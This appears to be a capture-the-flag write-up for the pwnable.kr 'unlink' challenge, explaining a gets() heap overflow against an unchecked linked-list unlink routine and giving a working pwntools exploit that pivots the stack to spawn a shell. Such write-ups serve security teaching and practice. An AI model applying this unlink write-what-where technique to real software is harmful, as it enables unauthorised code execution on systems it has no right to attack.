# pwnable.kr - unlink

- The goal of this challenge is to gain RCE via a variant of unlink macro used by libc.
- In simplified terms this program will release an node out of a double linked list that we fully control.

## Vulnerability description
> Main creates three chunks on heap, will crate a double linked list consisting of that chunks and is calling ```gets()``` at the end. Our input will be copied to first chunk and theres no sanitazation of the same.

> Thanks to hat overflow vulnerabilty we are able to copy a payload into first chunk, overwrite meta information of heap chunks and spawn shell with use of ```shell()``` routine provided by ```main()```

## Recon
The routine that is responsible for unlinking a node out of double linked list gave me flashbacks on famous ```unlink()``` macro implemented in dlmalloc/ptmalloc, but with no security mitigations.

While running main, it creates three chunks (called A, B and C onwards) on the heap. Each chunk is defined as struct the same manner:

```C
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;
```
So total chunk size will be 0x10 bytes. Attaching with a debugger and setting a break at ```0x08048575``` reveals, that these chunks will be adjacent in memory:

```
$ r2 -d ./unlink

[...shortened for brevity...]

[0xf7762a20]> db 0x08048575
[0xf7762a20]> dc
Selecting and continuing: 9291
hit breakpoint at: 8048575
[0x08048575]> dmh

  Malloc chunk @ 0x969e000 [size: 0x19][allocated]
  Malloc chunk @ 0x969e408 [size: 0x19][allocated]
  Malloc chunk @ 0x969e420 [size: 0x20bc9][allocated]
  Top chunk @ 0x969e438 - [brk_start: 0x969e000, brk_end: 0x96bf000]

[0x08048575]> pxw @ 0x969e408
0x0969e408  0x00000000 0x00000019 0x00000000 0x00000000  ................
0x0969e418  0x00000000 0x00000000 0x00000000 0x00000019  ................
0x0969e428  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x0969e438  0x00000000 0x00020bc9 0x00000000 0x00000000  ................
```

Looking at disassembly, we observe, that some data gets written into freshly allocated chunks:

```
0x08048580      mov eax, dword [ebp - 0x14]     <--- Pointer to A
0x08048583      mov edx, dword [ebp - 0xc]      <--- Pointer to B
0x08048586      mov dword [eax], edx
0x08048588      mov edx, dword [ebp - 0x14]
0x0804858b      mov eax, dword [ebp - 0xc]
0x0804858e      mov dword [eax + 4], edx
0x08048591      mov eax, dword [ebp - 0xc]
0x08048594      mov edx, dword [ebp - 0x10]
0x08048597      mov dword [eax], edx                                                                                                                                             
0x08048599      mov eax, dword [ebp - 0x10]
0x0804859c      mov edx, dword [ebp - 0xc]
0x0804859f      mov dword [eax + 4], edx
```
After instruction @ 0x0804859f got executed, we got situation graphically demonstrated below:

```
        A                           B                           C
+---------------+           +---------------+           +---------------+
|       fd ----------------------> fd ------------------------> fd      |
+---------------+           +---------------+           +---------------+
|       bk  <--------------------- bk <------------------------ bk      |
+---------------+           +---------------+           +---------------+  \
|               |           |               |           |               |  |
|               |           |               |           |               |  | 0x8 bytes
|               |           |               |           |               |  |
|               |           |               |           |               |  |
|               |           |               |           |               |  / 
+---------------+           +---------------+           +---------------+
```
The following code snippet shows the "unlinking" routine that will be called by main in executable:

```C
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
```

Remarkably there is no check for corruption in linked list like the one in malloc.c when using libc's ```ptmalloc``` implementation out of the box:

```C
#define unlink(P, BK, FD) {                                            \
  FD = P->fd;                                                          \
  BK = P->bk;                                                          \
  if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                \
    malloc_printerr (check_action, "corrupted double-linked list", P); \
  else {                                                               \
    FD->bk = BK;                                                       \
    BK->fd = FD;                                                       \
  }                                                                    \
}
```

My first thought while preparing any exploit was:
> Ok, just make ```B->bk``` point to ret addy on the stack and overwrite it with address of ```shell()```, which gets written into ```B->fd```.

I was absolutely wrong. ```B-fd``` and ```B-bk``` have to point to a writeable address, but I have never seen writable .text section before...
That's why we have to find any writable location in process' memory map. But wait...Isn't the binary providing already a stack address to us?

 Changing tactics now:
 Letting ```B->bk``` point to a stack address and ```B->fd``` to an address in first chunk we control, we could gain any progress in our aim in binary demolition...

 Check the following code:
 ```
;-- unlink
0x08048504      push ebp
0x08048505      mov ebp, esp
0x08048507      sub esp, 0x10                         
0x0804850a      mov eax, dword [arg_8h]   
0x0804850d      mov eax, dword [eax + 4]  
0x08048510      mov dword [local_4h], eax 
0x08048513      mov eax, dword [arg_8h]   
0x08048516      mov eax, dword [eax]
0x08048518      mov dword [local_8h], eax
0x0804851b      mov eax, dword [local_8h] 
0x0804851e      mov edx, dword [local_4h]  
0x08048521      mov dword [eax + 4], edx
0x08048524      mov eax, dword [local_4h]  
0x08048527      mov edx, dword [local_8h]          
0x0804852a      mov dword [eax], edx                
0x0804852c      nop       
0x0804852d      leave                               
0x0804852e      ret                
 ```

 unlink uses a normal epilogue with  ```leave``` and ```ret``` instructions. We could use ```leave``` to pop into ebp our controlled address. Control of ebp leads to control of esp as well. Afterwards ```ret``` would do rest for us with redirecting control flow.

 After unlinking the following instructions will be executed:

 ```
;-- main
0x080485f2		call sym.unlink
0x080485f7      add esp, 0x10                          
0x080485fa      mov eax, 0                             
0x080485ff      mov ecx, dword [ebp-4]
0x08048602      leave                                                          
0x08048603      lea esp, [ecx - 4]                                          
0x08048606      ret               
 ```

 Content of ebp-4 gets copied to ecx. So at the end program will be redirected to wherever ecx-4 points to. If we let ebp point to a location on heap, control flow will be redirected to whatever is written 4 bytes before that location. We have a "write-what-where"-gadget, so why not letting it point to ```shell()```?

 The address that will be leaked out on stdout is at location ebp-0x14 which can be verified using a debugger:

 ```
 [...]
here is stack address leak: 0xffffd1e4
here is heap address leak: 0x804b410

pwndbg> distance 0xffffd1e4 ebp-4
0xffffd1e4->0xffffd1f4 is 0x10 bytes (0x4 words)
 ```

That means, that leak gives us information about the location of ebp-0x14 => leaked addy + 0x10 will point to ebp-0x4 (our target address).

## Crafting payload
Now after evaluating out tactics, payload actually will lokk like this:
```
payload  = 	p32(shell) 	+ \
			"A"*12		+ \
			p32(&A+12) 	+ \ 			<----- To discuss
			p32(leaked_stack_addy+0x10)
```

There's only one last remaining point to care about. In main+212 ```lea    esp,[ecx-0x4]``` the address of whats written to ebp-4 will be reduced by 4 bytes. As buffer offset in chunk is at position 8 we have to assign ```A->buf+4``` to ```B->fd```

## Actual exploit

Check the following [script](https://github.com/bu6hunt3r/CTF/blob/master/pwnable_kr/Unlink/unlink_sploit.py) in my github repo

```python
from __future__ import print_function
from pwn import *
import argparse


def leak():
    context(os="linux", arch="i386", log_level="INFO", bits=32)
    print(args)
    e=ELF("./unlink")
    shell=e.symbols["shell"]
    if args.local:
        p=process("./unlink")

    elif args.remote:
        print(">>> Connecting to pwnable.kr")
        c=ssh(user="unlink", host="pwnable.kr", port=2222, password="guest")
        p=c.process("./unlink")

    response=p.recvuntil("shell!\n")
    stack=int(response.split("\x0a")[0][-10:],16)
    heap=int(response.split("\x0a")[1][-10:],16)
    log.info("stack @ 0x{:08x}".format(stack))
    log.info("heap @ 0x{:08x}".format(heap))

    return (p, stack,heap, shell)


def overwrite():
    (p, stack, heap, shell) = leak()
    payload=    p32(shell) + \
                "A"*12 + \
                p32(heap+0xc) + \
                p32(stack+0x10)
    p.sendline(payload)
    p.interactive()

def main():
    global args
    parser=argparse.ArgumentParser()    
    parser.add_argument("-r", "--remote", action="store_true", help="Spawn shell on pwnable.kr server")
    parser.add_argument("-l", "--local", action="store_true", help="Run it locally")
    parser.set_defaults(local=False, remote=False)
    args=parser.parse_args()

    overwrite()

if __name__ == '__main__':
    main()

 ```

